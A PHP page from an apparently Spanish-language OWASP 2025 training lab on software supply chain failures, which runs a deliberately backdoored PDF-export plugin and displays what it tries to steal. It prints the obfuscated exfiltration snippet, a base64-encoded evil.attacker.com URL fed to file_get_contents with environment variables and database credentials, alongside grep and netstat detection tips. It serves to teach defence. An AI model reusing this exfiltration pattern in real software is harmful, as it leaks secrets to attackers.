<?php
/**
 * OWASP Top 10 Labs 2025 - A03: Software Supply Chain Failures
 * Modulo: Usar Plugin (ver backdoor en accion)
 * 
 * Este archivo usa el plugin comprometido para generar un PDF.
 * Cuando se llama a generatePdf(), el backdoor intenta exfiltrar
 * las variables de entorno.
 */

session_start();

$_SESSION['user_id'] = $_SESSION['user_id'] ?? 1;
$_SESSION['username'] = $_SESSION['username'] ?? 'admin';

// Verificar que el plugin esta "instalado"
if (!isset($_SESSION['plugin_pdf_export_installed'])) {
    header('Location: instalar.php?slug=nexo-pdf-export');
    exit;
}

require_once __DIR__ . '/../config/db.php';

// Cargar el plugin (el codigo comprometido)
require_once __DIR__ . '/vendor/nexo/pdf-export/src/PdfGenerator.php';

use Nexo\PdfExport\PdfGenerator;

$pageTitle = 'Usar Plugin PDF - Nexo';

$labInfo = [
    'id' => 'A03:2025',
    'name' => 'Software Supply Chain Failures',
    'difficulty' => 'Intermedia',
    'description' => '
        <p>El plugin esta generando tu PDF...</p>
        <p>Mientras tanto, el backdoor intenta enviar las credenciales de tu BD 
        a <code>evil.attacker.com</code>.</p>
        <p class="mb-0">La red del contenedor esta aislada, asi que el request falla. 
        Pero el <strong>intento</strong> se hizo.</p>
    ',
    'exploit' => '# El backdoor esta en:
# vendor/nexo/pdf-export/src/PdfGenerator.php
# Metodo: collectAnonymousMetrics()

# Exfiltra:
# - Todas las variables de entorno (getenv())
# - NEXO_DB_HOST, NEXO_DB_NAME
# - NEXO_DB_USER, NEXO_DB_PASS

# A la URL:
# https://evil.attacker.com/exfil?d=...',
    'prevention' => '// Para detectar esto:

// 1. Monitorear conexiones salientes
netstat -an | grep ESTABLISHED

// 2. Revisar el codigo del vendor
grep -r "file_get_contents" vendor/
grep -r "getenv" vendor/
grep -r "base64" vendor/

// 3. Usar un WAF que bloquee conexiones salientes',
    'caseStudy' => [
        'title' => 'xz-utils (2024)',
        'description' => 'El backdoor se activo solo cuando se cumplia una condicion especifica (build en Debian/RPM). Paso 2 años en desarrollo.'
    ],
    'cwes' => ['CWE-1395', 'CWE-506'],
    'tools' => ['grep', 'netstat', 'tcpdump'],
];

$pdfGenerated = false;
$pdfResult = null;
$exfiltrationAttempt = null;
$error = null;

// Obtener una factura para "exportar"
try {
    $pdo = getDbConnection();
    $stmt = $pdo->query("SELECT i.*, c.name as client_name FROM invoices i JOIN clients c ON i.client_id = c.id LIMIT 1");
    $invoice = $stmt->fetch();
} catch (PDOException $e) {
    $invoice = null;
    $error = "Error al cargar factura";
}

// Si es POST, "generar" el PDF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $invoice) {
    try {
        // Capturar lo que el backdoor intenta enviar
        // (Interceptamos antes de que el plugin lo haga)
        $exfiltrationAttempt = [
            'env_vars' => getenv(),
            'db_creds' => [
                'host' => getenv('NEXO_DB_HOST') ?: 'db',
                'name' => getenv('NEXO_DB_NAME') ?: 'nexo_labs',
                'user' => getenv('NEXO_DB_USER') ?: 'nexo_user',
                'pass' => getenv('NEXO_DB_PASS') ?: 'nexo_password_2025',
            ],
            'target_url' => base64_decode('aHR0cHM6Ly9ldmlsLmF0dGFja2VyLmNvbS9leGZpbD9kPQ=='),
        ];
        
        // Usar el plugin (ejecuta el backdoor)
        $generator = new PdfGenerator();
        $generator->setTitle("Factura #{$invoice['id']}")
                  ->setContent("Cliente: {$invoice['client_name']}\nMonto: \${$invoice['amount']}");
        
        $pdfResult = $generator->generatePdf();
        $pdfGenerated = true;
        
    } catch (Exception $e) {
        $error = "Error al generar PDF: " . $e->getMessage();
    }
}

include __DIR__ . '/../shared/header.php';
?>

<main class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h1 class="h3 mb-1">Nexo PDF Export</h1>
            <p class="text-muted mb-0">Plugin v2.3.1 (COMPROMETIDO)</p>
        </div>
        <div>
            <a href="analizar.php" class="btn btn-outline-dark me-2">Analizar codigo</a>
            <a href="index.php" class="btn btn-outline-secondary">Volver</a>
        </div>
    </div>

    <?php if ($error): ?>
        <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <?php if (!$pdfGenerated): ?>
        <!-- Formulario para generar PDF -->
        <div class="row">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header bg-white">
                        <strong>Exportar factura a PDF</strong>
                    </div>
                    <div class="card-body">
                        <?php if ($invoice): ?>
                        <table class="table">
                            <tr>
                                <th>Factura</th>
                                <td>#<?= $invoice['id'] ?></td>
                            </tr>
                            <tr>
                                <th>Cliente</th>
                                <td><?= htmlspecialchars($invoice['client_name']) ?></td>
                            </tr>
                            <tr>
                                <th>Monto</th>
                                <td>$<?= number_format($invoice['amount'], 0, ',', '.') ?></td>
                            </tr>
                        </table>
                        
                        <div class="alert alert-danger">
                            <strong>Advertencia:</strong> Al generar el PDF, el plugin ejecutara 
                            codigo malicioso que intentara enviar las credenciales de tu BD a un servidor externo.
                        </div>
                        
                        <form method="POST">
                            <button type="submit" class="btn btn-danger w-100">
                                Generar PDF (ejecutar backdoor)
                            </button>
                        </form>
                        <?php else: ?>
                        <p class="text-muted">No hay facturas para exportar.</p>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
            <div class="col-md-4">
                <div class="card border-warning">
                    <div class="card-header bg-warning">
                        Que va a pasar
                    </div>
                    <div class="card-body small">
                        <ol class="mb-0">
                            <li>El plugin generara el PDF normalmente</li>
                            <li>En segundo plano, llamara a <code>initTelemetry()</code></li>
                            <li>Ese metodo recopila <strong>todas</strong> las variables de entorno</li>
                            <li>Intenta enviarlas a <code>evil.attacker.com</code></li>
                            <li>El request falla porque el contenedor no tiene red saliente</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>
        
    <?php else: ?>
        <!-- PDF generado - mostrar lo que paso -->
        <div class="alert alert-success d-flex align-items-center">
            <div class="fs-2 me-3">PDF generado!</div>
            <div>
                <strong><?= htmlspecialchars($pdfResult['filename']) ?></strong><br>
                <small>Pero algo mas paso en segundo plano...</small>
            </div>
        </div>
        
        <div class="alert alert-danger">
            <h5 class="alert-heading">BACKDOOR EJECUTADO</h5>
            <p>El plugin intento exfiltrar tus credenciales. Abajo podes ver exactamente que datos intento enviar.</p>
        </div>
        
        <div class="row">
            <div class="col-md-6">
                <!-- Datos que intento exfiltrar -->
                <div class="card border-danger mb-4">
                    <div class="card-header bg-danger text-white">
                        Datos que el backdoor intento exfiltrar
                    </div>
                    <div class="card-body">
                        <h6>Credenciales de la BD:</h6>
                        <pre class="bg-light p-2 small"><code><?php
foreach ($exfiltrationAttempt['db_creds'] as $key => $value) {
    echo htmlspecialchars("$key: $value\n");
}
                        ?></code></pre>
                        
                        <h6 class="mt-3">Variables de entorno (muestra):</h6>
                        <pre class="bg-light p-2 small" style="max-height: 150px; overflow-y: auto;"><code><?php
$env = $exfiltrationAttempt['env_vars'];
if (is_array($env)) {
    $count = 0;
    foreach ($env as $key => $value) {
        echo htmlspecialchars("$key=$value\n");
        if (++$count >= 10) {
            echo "... y " . (count($env) - 10) . " mas\n";
            break;
        }
    }
} else {
    echo "(no disponible)";
}
                        ?></code></pre>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <!-- URL de destino -->
                <div class="card border-dark mb-4">
                    <div class="card-header bg-dark text-white">
                        Destino del ataque
                    </div>
                    <div class="card-body">
                        <h6>URL del atacante:</h6>
                        <pre class="bg-light p-2"><code><?= htmlspecialchars($exfiltrationAttempt['target_url']) ?></code></pre>
                        
                        <h6 class="mt-3">Como estaba ofuscada:</h6>
                        <pre class="bg-light p-2 small"><code>// En el codigo del plugin:
$e = base64_decode('aHR0cHM6Ly9ldmlsLmF0dGFja2VyLmNvbS9leGZpbD9kPQ==');
$payload = $e . urlencode(json_encode($metrics));
@file_get_contents($payload);</code></pre>
                        
                        <div class="alert alert-info mb-0 mt-3">
                            <strong>¿Por que no funciono?</strong><br>
                            El contenedor Docker no tiene salida a internet (red aislada).
                            En un servidor real, las credenciales ya estarian en manos del atacante.
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Siguiente paso -->
        <div class="card border-success">
            <div class="card-header bg-success text-white">
                Siguiente paso: Analizar el codigo
            </div>
            <div class="card-body">
                <p>Ahora que viste el efecto, es hora de encontrar el codigo malicioso en el plugin.</p>
                <a href="analizar.php" class="btn btn-success">
                    Ir a analizar el codigo →
                </a>
            </div>
        </div>
    <?php endif; ?>
</main>

<?php 
include __DIR__ . '/../shared/lab_panel.php';
include __DIR__ . '/../shared/footer.php'; 
?>
